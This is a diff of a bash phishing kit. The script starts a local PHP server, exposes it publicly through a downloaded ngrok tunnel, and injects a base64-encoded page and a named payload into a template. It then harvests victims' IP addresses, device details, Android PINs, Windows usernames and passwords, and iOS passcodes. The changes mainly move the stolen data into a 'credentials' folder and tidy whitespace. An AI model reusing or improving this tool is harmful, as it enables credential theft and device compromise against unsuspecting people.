@@ -65,7 +65,7 @@ dependencies() {
 
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
+
 
 
 }
@@ -77,7 +77,8 @@ IFS=$'\n'
 device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
-cat ip.txt >> saved.ip.txt
+mkdir credentials
+cat ip.txt >> credentials/saved.ip.txt
 
 
 }
@@ -103,7 +104,7 @@ printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
 pin=$(tail -n1 pin.txt)
 printf "\e[1;92m[\e[0m+\e[1;92m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
 printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
-cat pin.txt >> pin.saved.txt
+cat pin.txt >> credentials/pin.saved.txt
 rm -rf pin.txt
 fi
 
@@ -114,8 +115,8 @@ password=$(tail -n1 passwords.txt)
 printf "\e[1;92m[\e[0m+\e[1;92m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
 printf "\e[1;92m[\e[0m+\e[1;92m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
 printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
-cat usernames.txt >> win.saved.txt
-cat passwords.txt >> win.saved.txt
+cat usernames.txt >> credentials/win.saved.txt
+cat passwords.txt >> credentials/win.saved.txt
 rm -rf usernames.txt
 rm -rf passwords.txt
 fi
@@ -125,13 +126,13 @@ printf "\n\e[1;92m[\e[0m+\e[1;92m] IOS passcode received!\e[0m\n"
 passcode=$(tail -n1 passcode.txt)
 printf "\e[1;92m[\e[0m+\e[1;92m] Passcode:\e[0m\e[1;77m  %s\e[0m\n" $passcode
 printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m  passcode.txt\e[0m\n"
-cat passcode.txt >> passcode.saved.txt
+cat passcode.txt >> credentials/passcode.saved.txt
 rm -rf passcode.txt
 fi
 
 sleep 0.5
 
-done 
+done
 
 }
 
@@ -180,7 +181,7 @@ IFS=$'\n'
 data_base64=$(base64 -w 0 win2.html)
 temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
 
-#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
+#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n"
 #printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
 sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html
 
@@ -212,7 +213,7 @@ exit 1
 fi
 
 else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -225,7 +226,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -281,7 +282,7 @@ IFS=$'\n'
 data_base64=$(base64 -w 0 win2.html)
 temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
 
-#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
+#printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n"
 #printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
 sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html
 
@@ -326,4 +327,3 @@ dependencies
 #start1 # DISABLED
 redirect
 ngrok_server
-
